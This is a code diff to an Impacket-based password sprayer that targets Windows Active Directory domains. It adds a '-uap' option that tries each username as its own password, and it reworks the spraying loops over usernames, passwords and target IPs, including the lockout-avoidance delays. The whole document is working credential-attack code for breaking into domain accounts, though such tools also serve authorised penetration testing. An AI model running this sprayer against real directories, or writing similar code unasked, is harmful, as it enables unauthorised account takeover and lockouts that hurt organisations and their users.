@@ -122,6 +122,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="Impacket made password sprayer for Windows AD")
     parser.add_argument('-u', action='store', help='Username or path to file containing usernames 1 per line')
     parser.add_argument('-p', action='store', help='Password to try or file of passwords')
+    parser.add_argument('-uap', action='store_true',  default=False, help='Sets the username as the password')
     parser.add_argument('-d', action='store', help='FQDN to use')
     parser.add_argument('-H', action='store', help='Password hash to use LM:NT')
     parser.add_argument('-o', action='store', help='Output file')
@@ -157,7 +158,7 @@ if __name__ == '__main__':
         print(red_minus + " Domain is required")
         sys.exit(0)
 
-    if options.p is None and options.u != '' and options.H is None:
+    if options.p is None and options.u != '' and options.H is None and options.uap == False:
         from getpass import getpass
 
         options.p = getpass("Password:")
@@ -166,17 +167,21 @@ if __name__ == '__main__':
         if options.H.find(':') == -1:
             options.H = ':' + options.H
 
-    if os.path.isfile(options.p): # check if password is a file of passwords
-        with open(options.p, 'r') as f:
-            unclean_passwords = f.readlines()
-            f.close()
+    if options.uap == False:
+        if os.path.isfile(options.p): # check if password is a file of passwords
+            with open(options.p, 'r') as f:
+                unclean_passwords = f.readlines()
+                f.close()
 
-        for item in unclean_passwords: # sanatize passwords
-            item = item.replace('\n', '')
-            item = item.replace('\r', '')
-            password_list.append(item)
+            for item in unclean_passwords: # sanatize passwords
+                item = item.replace('\n', '')
+                item = item.replace('\r', '')
+                password_list.append(item)
+        else:
+            password_list.append(options.p)
+
     else:
-        password_list.append(options.p)
+        password_list.append('Username as Password')
 
     if len(password_list) < 1:
         print('Password list is empty')
@@ -247,15 +252,50 @@ if __name__ == '__main__':
                 for password in password_list:
                     print('Trying password {}'.format(password))
                     for username in users_cleaned:
-                        if count+1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1: # in a sense if we are at the last password before our sleep and this is not the last password in the list and we are at the last username in the list we will set doit to true
+                        if options.uap == True:
+                            password = username
+                        elif count+1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1: # in a sense if we are at the last password before our sleep and this is not the last password in the list and we are at the last username in the list we will set doit to true
                             doit = True
+
                         try:
                             out = thread_exe.schedule(mt_execute, (username,curr_ip,password,doit,), timeout=options.timeout)
                             doit = False
                         except Exception as e:
                             print(str(e))
                     count += 1
-                    if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1: # second part basically ensures that the current password's index does not equal the end of the array to prevent a sleep when there is no need
+                    if options.uap == False:
+                        if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1: # second part basically ensures that the current password's index does not equal the end of the array to prevent a sleep when there is no need
+                            count = 0
+                            try:
+                                sleep(options.pd * 60)
+                            except KeyboardInterrupt as e:
+                                print('\nCTRL+C detected continuing in 3')
+                                sleep(1)
+                                print('2')
+                                sleep(1)
+                                print('1')
+                                sleep(1)
+                                continue
+
+
+    else:
+        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
+            for password in password_list:
+                print('Trying password {}'.format(password))
+                for username in users_cleaned:
+                    curr_ip = addresses[random.randint(0, len(addresses)-1)]
+                    if options.uap == True:
+                        password = username
+                    elif count + 1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1:
+                        doit = True
+                    try:
+                        out = thread_exe.schedule(mt_execute, (username,curr_ip,password,doit,), timeout=options.timeout)
+                        doit = False
+                    except Exception as e:
+                        print(str(e))
+                count += 1
+                if options.uap == False:
+                    if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1:
                         count = 0
                         try:
                             sleep(options.pd * 60)
@@ -267,31 +307,3 @@ if __name__ == '__main__':
                             print('1')
                             sleep(1)
                             continue
-
-
-    else:
-        with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
-            for password in password_list:
-                print('Trying password {}'.format(password))
-                for username in users_cleaned:
-                    curr_ip = addresses[random.randint(0, len(addresses)-1)]
-                    if count + 1 == options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list) - 1 and len(users_cleaned) - 1 - users_cleaned[::-1].index(username) == len(users_cleaned) - 1:
-                        doit = True
-                    try:
-                        out = thread_exe.schedule(mt_execute, (username,curr_ip,password,doit,), timeout=options.timeout)
-                        doit = False
-                    except Exception as e:
-                        print(str(e))
-                count += 1
-                if count >= options.m and len(password_list) - 1 - password_list[::-1].index(password) != len(password_list)-1:
-                    count = 0
-                    try:
-                        sleep(options.pd * 60)
-                    except KeyboardInterrupt as e:
-                        print('\nCTRL+C detected continuing in 3')
-                        sleep(1)
-                        print('2')
-                        sleep(1)
-                        print('1')
-                        sleep(1)
-                        continue
